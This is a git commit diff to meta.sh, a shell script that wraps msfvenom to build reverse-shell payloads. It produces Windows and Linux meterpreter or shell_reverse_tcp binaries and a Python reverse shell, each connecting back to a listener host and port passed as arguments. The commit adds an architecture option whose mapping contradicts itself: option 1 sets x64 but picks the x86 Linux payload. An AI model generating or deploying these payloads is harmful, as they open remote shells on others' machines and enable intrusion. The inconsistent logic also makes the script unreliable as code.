cea4815fa981f63f3f57bf2a4c49da0c03d1dc18
str1ke007 <73118143+str1ke007@users.noreply.github.com>
2022-07-28 18:33:48 +0530

    minor change
    added another if-else for architecture

--- meta.sh
+++ meta.sh
@@ -5,19 +5,30 @@
 # $3 -> options
 # $4 -> Arch
 
+ARCH="-"
+if [ $4 -eq 1 ]
+then
+	ARCH="x64"
+elif [ $4 -eq 2 ]
+then
+	ARCH="x86"
+else
+	ARCH="x86"
+fi
+
 if [ $3 -eq 1 ]
 then
 	# Windows
-	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f exe > reverse.exe
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 --arch $ARCH -f exe > reverse.exe
 elif [ $3 -eq 2 ]
 then
 	if [ $4 -eq 1 ]
 	then
 		# Linux (x86)
-		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f elf > reverse.elf
+		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 --arch $ARCH -f elf > reverse.elf
 	else
 		# Linux (x64)
-		msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf > shell.elf
+		msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 --arch $ARCH -f elf > shell.elf
 	fi
 elif [ $3 -eq 3 ]
 then
@@ -28,7 +39,7 @@ then
 	# Script Based (Python)
 	msfvenom -p cmd/unix/reverse_python LHOST=$1 LPORT=$2 -f raw > reverse.py
 else
-	echo "Error!"
+	echo "[-] Invalid Input!"
 fi
 
 echo -n "[-] File Location: "; pwd
